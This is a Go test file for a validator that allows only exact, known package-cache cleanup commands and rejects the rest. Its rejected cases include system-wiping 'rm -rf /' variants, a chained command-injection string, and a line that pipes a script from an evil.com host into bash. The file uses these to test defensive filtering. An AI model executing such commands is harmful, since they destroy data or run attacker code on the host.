package main

import "testing"

func TestIsAllowedPackageCleanCommand(t *testing.T) {
	allowed := []string{
		"npm cache clean --force",
		"pip cache purge",
		"dotnet nuget locals all --clear",
		"sudo apt-get clean || apt-get clean",
		"sudo dnf clean all || sudo yum clean all",
		"sudo pacman -Scc --noconfirm || pacman -Scc --noconfirm",
		"sudo zypper clean -a || zypper clean -a",
		"rm -rf ~/.cargo/registry/cache/*",
		"go clean -cache -modcache",
	}

	for _, cmd := range allowed {
		if !isAllowedPackageCleanCommand(cmd) {
			t.Errorf("expected known package cleanup command to be allowed: %q", cmd)
		}
	}

	rejected := []string{
		"npm cache clean --force && rm -rf /",
		"sudo rm -rf /",
		"",
		"rm -rf /",
		"apt-get install malicious",
		"sudo apt-get clean; curl http://evil.com/script.sh | bash",
		"sudo apt-get clean",
		"npm cache clean --force --unsafe-perm",
		"rm -rf --no-preserve-root /",
		"docker system prune -af",
	}

	for _, cmd := range rejected {
		if isAllowedPackageCleanCommand(cmd) {
			t.Errorf("expected unsafe command to be rejected: %q", cmd)
		}
	}
}

func TestIsAllowedPackageCleanCommandWhitespace(t *testing.T) {
	if !isAllowedPackageCleanCommand("npm cache clean --force ") {
		t.Fatal("expected command with trailing space to be allowed (trimmed internally)")
	}
	if !isAllowedPackageCleanCommand("  go clean -cache -modcache  ") {
		t.Fatal("expected command with leading/trailing spaces to be allowed")
	}
}

func TestIsAllowedPackageCleanCommandCase(t *testing.T) {
	if isAllowedPackageCleanCommand("NPM CACHE CLEAN --FORCE") {
		t.Fatal("expected uppercase command to be rejected (case-sensitive)")
	}
	if isAllowedPackageCleanCommand("Go Clean -Cache -Modcache") {
		t.Fatal("expected mixed case command to be rejected")
	}
}

func TestIsAllowedPackageCleanCommandExactMatch(t *testing.T) {
	// Verify exact match (not substring match)
	cmd := "npm cache clean --force"
	if !isAllowedPackageCleanCommand(cmd) {
		t.Fatal("expected exact match to be allowed")
	}

	// Slight variations should be rejected
	variations := []string{
		"npm cache clean --force --extra",
		"sudo npm cache clean --force",
		"npm cache clean --force --all",
	}
	for _, v := range variations {
		if isAllowedPackageCleanCommand(v) {
			t.Errorf("expected variation %q to be rejected", v)
		}
	}
}
